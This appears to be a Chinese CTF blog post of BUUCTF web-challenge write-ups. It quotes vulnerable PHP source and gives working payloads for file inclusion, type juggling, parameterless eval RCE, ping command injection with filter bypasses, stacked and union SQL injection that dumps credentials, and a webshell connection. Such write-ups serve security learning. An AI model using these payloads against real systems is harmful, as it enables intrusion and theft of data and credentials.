+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">"../"</span>)||stristr(<span class="variable">$file</span>, <span class="string">"tp"</span>)||stristr(<span class="variable">$file</span>,<span class="string">"input"</span>)||stristr(<span class="variable">$file</span>,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    include(<span class="variable">$file</span>); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>文件包含</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_4.PNG" alt=""><br>base64解码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_5.PNG" alt=""></p>
+<h3 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Knife/Knife_0.PNG" alt=""><br>直接用菜刀连<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Knife/Knife_1.PNG" alt=""></p>
+<h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Http/Http_0.PNG" alt=""><br>访问Secret.php<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Http/Http_1.PNG" alt=""><br>应该是要伪造Referer:<a href="https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com</a><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Http/Http_2.PNG" alt=""><br>修改UA:Syclover<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Http/Http_3.PNG" alt=""></p>
+<h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Include/Include_0.PNG" alt=""><br>显然是文件包含</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<p>base64解码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Include/Include_1.PNG" alt=""></p>
+<h3 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h3><p>根据题目，应该是考察备份文件<br>访问index.php.bak,打开后</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>php弱类型比较,$str会被处理为123<br>payload:?key=123</p>
+<h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p>命令执行漏洞<br><img src="" alt=""><br>ls 没发现flag相关文件，直接cat /flag,flag就出来了</p>
+<h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p>打开啥也没有<br>bp、dirsearch、GitHacker全上了一遍<br>在GitHacker中扫出来了index.php</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, <span class="variable">$_GET</span>[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, NULL, <span class="variable">$_GET</span>[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, <span class="variable">$_GET</span>[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                // <span class="built_in">echo</span> <span class="variable">$_GET</span>[<span class="string">'exp'</span>];</span><br><span class="line">                @<span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                die(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>过滤了php伪协议，使用的函数不能带参数，一些基本函数也被过滤了，明显是无参RCE<br>只能利用一些特殊函数来构造exp了<br>第一步，扫描当前目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/GXYCTF2019_REC/rce.jpg" alt=""><br>此时flag.php在数组中的第三个，接下来就是要想办法读取flag.php的内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+<p>current(localeconv())来构造出获取当前目录的’.’<br>array_reverse():以相反的元素顺序返回数组<br>next():将内部指针指向数组中的下一个元素，并输出<br>highlight_file():打印输出或者返回文件中语法高亮的代码</p>
+<h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce0.jpg" alt=""><br>get方式传入参数ip<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce1.jpg" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1|ls</span><br></pre></td></tr></table></figure>
+<p>命令执行漏洞<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce2.jpg" alt=""><br>发现了flag.php，接下来就是要想办法读出flag<br>测试一下cat</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1|cat flag.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce3.jpg" alt=""><br>看来过滤了空格，可以使用’,’代替，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1|&#123;cat,flag.php&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce4.jpg" alt=""><br>看来把’{}’也过滤了,使用内联执行绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1|cat<span class="variable">$IFS</span><span class="variable">$1</span>`ls`</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce5.jpg" alt=""></p>
+<h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> filter(<span class="variable">$img</span>)&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = array(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,<span class="variable">$filter_arr</span>).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="built_in">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">''</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="built_in">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'function'</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">'img'</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">'phpinfo();'</span>); //maybe you can find something <span class="keyword">in</span> here!</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="built_in">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在代码最下方发现如果$function == ‘phpinfo’，就可以访问phpinfo，它说那里有提示</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=phpinfo</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_serialize_php/easy_serialize_php0.jpg" alt=""><br>接下来就是想办法读取d0g3_f1ag.php</p>
+<h3 id="强网杯-2019-随便注-堆叠注入、预编译绕过"><a href="#强网杯-2019-随便注-堆叠注入、预编译绕过" class="headerlink" title="[强网杯 2019]随便注(堆叠注入、预编译绕过)"></a>[强网杯 2019]随便注(堆叠注入、预编译绕过)</h3><p>测试注入点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">'          //报错</span></span><br><span class="line"><span class="string">1'</span> --+      //没报错</span><br></pre></td></tr></table></figure>
+<p>单引号注入，判断一下列数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">' order by 2 --+       列数为3时报错，说明只有两列</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0<span class="string">' union select 1,2 --+</span></span><br></pre></td></tr></table></figure>
+<p>返回了一段代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure>
+<p>对关键字进行了过滤，我也不知道咋绕过啊，大佬说利用堆叠注入绕过过滤</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0<span class="string">';show tables --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easy_sql0.jpg" alt=""><br>发现有两个表，挨个爆字段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0<span class="string">';show columns from `1919810931114514` --+         这里表名要加反引号,不是单引号</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easysql1.jpg" alt=""><br>不用爆words表了，接下里就是要查flag，但是关键字被过滤了。这里可以利用预编译绕过select限制<br>预编译相关语法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>:用于设置变量名和变量值</span><br><span class="line">prepare:用于预备一个语句，并赋予名称，以后可以引用该语句</span><br><span class="line">execute:执行预备的语句</span><br><span class="line">deallocate prepare:释放预处理语句</span><br></pre></td></tr></table></figure>
+<p>payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0<span class="string">';set @sql=concat('</span>selec<span class="string">','</span>t * from `1919810931114514`;<span class="string">');prepare stmt_name from @sql;execute stmt_name --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easysql2.jpg" alt=""><br>过滤了set和prepare,但是strstr()函数对大小写不敏感<br>payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0<span class="string">';Set @sql=concat('</span>selec<span class="string">','</span>t * from `1919810931114514`;<span class="string">');Prepare stmt_name from @sql;execute stmt_name --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easysql3.jpg" alt=""></p>
+<h3 id="SUCTF-2019-EasySQL-堆叠注入"><a href="#SUCTF-2019-EasySQL-堆叠注入" class="headerlink" title="[SUCTF 2019]EasySQL(堆叠注入)"></a>[SUCTF 2019]EasySQL(堆叠注入)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1               //返回Array ( [0] =&gt; 1 )</span><br><span class="line">1<span class="string">'              //无返回</span></span><br><span class="line"><span class="string">1'</span> or <span class="string">'1'</span>=<span class="string">'1    //返回Nonono.</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Easysql/Easysql0.jpg" alt=""><br>使用堆叠注入爆一下表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;show tables;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Easysql/Easysql1.png" alt=""><br>大佬说官方给出的查询代码是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="variable">$post</span>[<span class="string">'query'</span>]||flag from Flag</span><br></pre></td></tr></table></figure>
+<p>这里就是要想办法让||的作用不再是逻辑或，而是连接符<br>官方payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="built_in">set</span> sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>
+<p>在oracle中缺省支持通过’||’来实现字符串拼接，但在mysql中缺省不支持，需要调整mysql 的sql_mode<br>模式：pipes_as_concat 来实现oracle 的一些功能<br>拼接一下就是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1;<span class="built_in">set</span> sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</span><br></pre></td></tr></table></figure>
+<p>sql_mode:它定义了MySQL应支持的SQL语法，以及应该在数据上做何种确认检查，其中的PIPES_AS_CONCAT会将||当作字符串的连接操作符，在该模式下进行查询时，使用字母连接会报错，只有使用数字连接才能够查询成功.这里select 1||flag from Flag相当于执行了select 1和select flag from Flag这两个查询操作<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Easysql/Easysql2.png" alt=""></p>
+<h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>测试万能密码，直接就登陆进去了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql0.jpg" alt=""><br>使用给出的密码登陆，接下来进行注入点测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin<span class="string">'&amp;password=123</span></span><br></pre></td></tr></table></figure>
+<p>单引号注入，order by爆字段数,最终字段为4时报错，说明字段数为3</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin<span class="string">' order by 3%23&amp;password=123</span></span><br></pre></td></tr></table></figure>
+<p>判断注入字段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,3%23&amp;password=123</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql1.jpg" alt=""><br>回显点为2，3<br>爆数据库名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,database()%23&amp;password=123</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql2.jpg" alt=""><br>数据库名为geek,爆表名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=123</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql3.jpg" alt=""><br>得到表名：geekuser,l0ve1ysq1<br>爆字段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>geekuser<span class="string">'%23&amp;password=123</span></span><br><span class="line"><span class="string">?username=0'</span> union select 1,2,group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">'l0ve1ysq1'</span>%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql4.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql5.jpg" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,group_concat(id,0x3a,username,0x3a,password) from geekuser%23&amp;password=123</span></span><br><span class="line"><span class="string">?username=0'</span> union select 1,2,group_concat(id,0x3a,username,0x3a,password) from l0ve1ysq1%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql6.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql7.jpg" alt=""></p>
+<h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/hacker/hacker0.jpg" alt=""><br>下载后打开<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/hacker/hacker1.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/hacker/hacker2.jpg" alt=""><br>很多这种PHP文件,从其中的内容可以看出是一句话木马，但是很多都是混淆视听的，很明显被置空了，这道题就是要编写脚本来找出真正有效的一句话木马</p>
+<h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>] = <span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">'host'</span>];</span><br><span class="line">    <span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = md5(<span class="string">"glzjin"</span>. <span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'you are in sandbox '</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="built_in">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="built_in">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看见system函数，应该是RCE<br>escapeshellarg():<a href="https://www.php.net/manual/zh/function.escapeshellarg.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.escapeshellarg.php</a><br>escapeshellcmd():<a href="https://www.php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.escapeshellcmd.php</a><br>这两个函数连用就会形成注入,漏洞介绍及利用方法：<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">https://paper.seebug.org/164/</a><br>这里还有一个关键点就是nmap命令:<a href="https://www.cnblogs.com/liaopeng123/p/11281516.html" target="_blank" rel="noopener">https://www.cnblogs.com/liaopeng123/p/11281516.html</a><br>其中-oG命令就是这里的利用点</p>
